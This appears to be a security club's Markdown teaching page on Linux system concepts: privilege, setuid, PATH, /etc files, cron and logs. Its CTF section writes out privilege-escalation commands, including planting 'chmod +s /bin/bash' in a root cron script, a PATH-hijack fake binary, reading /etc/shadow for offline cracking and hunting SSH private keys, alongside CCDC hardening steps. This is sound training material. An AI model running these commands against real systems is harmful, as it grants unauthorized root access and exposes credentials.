+++
title = "System Concepts"
weight = 2
description = "The system-level concepts — privilege, trust boundaries, process access — behind most vulnerabilities."
icon = "fa-solid fa-memory"
+++

Security vulnerabilities on the system level come down to a few recurring patterns: privilege misconfigurations, trusted environments running untrusted data, and processes with more access than they need.

This page covers the concepts that underpin most of those patterns.

---

## Users and Groups

Every process runs as a user. Every file is owned by a user and a group. Access is controlled by matching those identities.

- `root` (UID 0) has no restrictions.
- Regular users have restricted access by design.
- Groups let multiple users share access to a resource.

The principle of least privilege: a process should run with only the permissions it needs. When it has more, that is a vulnerability surface.

---

## Processes and Privilege

When you run a program, it inherits your user identity. That is the security boundary.

Things that break this model (intentionally and otherwise):

| Mechanism | What it does |
|---|---|
| `setuid` bit | Binary runs as its owner, not the caller |
| `sudo` | Elevate to root (or another user) for one command |
| `su` | Switch to another user for a session |
| Capabilities | Grant specific root powers without full root |

A `setuid` binary owned by root that is exploitable gives you root. That is the classic privilege escalation scenario.

---

## Environment Variables

Environment variables are key-value pairs available to all processes. They carry configuration without hardcoding it in source.

```bash
printenv                    # show all environment variables
echo $PATH                  # where the shell looks for executables
echo $HOME                  # your home directory

export MYVAR="value"        # set for current session and subprocesses
```

**Security relevance:** An attacker with control over environment variables can often influence program behavior. `PATH` manipulation is a classic attack vector — if a script calls `python` without an absolute path and `PATH` is attacker-controlled, the attacker can substitute a malicious binary.

---

## /etc Files That Matter

| File | What it is |
|---|---|
| `/etc/passwd` | User account info (no passwords) |
| `/etc/shadow` | Password hashes (root-readable only) |
| `/etc/group` | Group memberships |
| `/etc/sudoers` | Who can run what with sudo |
| `/etc/hosts` | Local hostname-to-IP mappings |
| `/etc/crontab` | Scheduled tasks running as root |
| `/etc/ssh/sshd_config` | SSH server configuration |

On a compromised system, these are among the first files you read. On a hardened system, these are among the first things audited.

---

## Cron Jobs

Cron is the task scheduler. Jobs run on a schedule, often as root.

```bash
crontab -l              # list current user's cron jobs
cat /etc/crontab        # system-wide cron jobs
ls /etc/cron.d/         # additional cron configs
```

A world-writable script being executed by a root cron job is an instant privilege escalation path.

---

## Logs

```bash
/var/log/auth.log       # authentication events (ssh logins, sudo usage)
/var/log/syslog         # general system messages
/var/log/apache2/       # web server logs
/var/log/nginx/         # nginx logs
journalctl -xe          # systemd journal
```

Logs are evidence. Attackers try to clear them. Defenders aggregate and monitor them with SIEM tools.

---

## In CTF Environments

System-level concepts are the foundation of privilege escalation and blue team hardening. They show up in every CTF Linux box and in CCDC on day one.

**Exploiting cron — most overlooked privesc vector:**
```bash
# Find cron jobs running as root
cat /etc/crontab
ls -la /etc/cron*
cat /var/spool/cron/crontabs/root 2>/dev/null

# Find scripts called by root cron that are world-writable
find /etc/cron* /var/spool/cron -type f 2>/dev/null | xargs ls -la 2>/dev/null

# If a cron job runs /opt/backup.sh and you can write to it:
echo "chmod +s /bin/bash" >> /opt/backup.sh
# Wait for cron to run, then: bash -p → root shell
```

**PATH hijacking — exploiting relative command calls:**
```bash
# If a setuid script calls `python` or `curl` without an absolute path:
mkdir /tmp/hijack
echo '#!/bin/bash' > /tmp/hijack/python
echo 'chmod +s /bin/bash' >> /tmp/hijack/python
chmod +x /tmp/hijack/python
export PATH=/tmp/hijack:$PATH
# Run the vulnerable setuid binary — it calls your fake `python` instead
```

**Reading sensitive /etc files after getting a shell:**
```bash
# Check sudoers — who can run what without a password
cat /etc/sudoers
cat /etc/sudoers.d/*

# Pull password hashes if you have root (crack offline with hashcat/john)
cat /etc/shadow

# Find SSH keys
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
cat ~/.ssh/authorized_keys   # can you add your own key?
```

**CCDC — hardening system concepts on day one:**

These are the first things an experienced CCDC team locks down when the competition starts:

```bash
# 1. Check and restrict sudoers immediately
visudo   # remove NOPASSWD entries and wildcard rules

# 2. Disable unnecessary services
systemctl list-units --type=service --state=running
systemctl stop <service>; systemctl disable <service>

# 3. Check for cron jobs left by the scenario injects (red team backdoors often use cron)
for user in $(cut -f1 -d: /etc/passwd); do
    crontab -u $user -l 2>/dev/null && echo "--- $user"
done

# 4. Watch auth logs live for red team activity
tail -f /var/log/auth.log | grep -E "(Failed|Accepted|sudo)"
```

**Log analysis for forensics CTF challenges:**
```bash
# Count failed login attempts by IP (brute force detection)
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn

# Find what commands were run via sudo
grep "sudo" /var/log/auth.log

# Find successful logins
grep "Accepted" /var/log/auth.log
```

---

> [!info] How the Club Uses This
> Cron, PATH, and sudo misconfigurations are the three most common privilege escalation paths in CTF Linux boxes. In CCDC, hardening these same vectors before the red team can use them is a core day-one task.

---

**References**

- [Linux Privilege Escalation techniques — HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PEAS-ng — automated privilege escalation enumeration](https://github.com/peass-ng/PEASS-ng)
- [Understanding /etc/passwd and /etc/shadow](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/)
